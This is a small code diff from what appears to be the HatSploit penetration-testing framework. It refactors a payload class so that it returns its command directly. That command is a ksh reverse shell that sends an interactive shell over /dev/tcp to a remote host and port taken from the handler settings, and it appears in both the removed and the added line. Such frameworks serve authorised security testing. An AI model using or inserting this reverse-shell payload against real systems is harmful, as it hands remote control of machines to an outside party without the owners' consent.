@@ -27,5 +27,4 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = f"ksh -c 'ksh >/dev/tcp/{remote_host}/{remote_port} 2>&1 <&1'"
-        return payload
+        return f"ksh -c 'ksh >/dev/tcp/{remote_host}/{remote_port} 2>&1 <&1'"
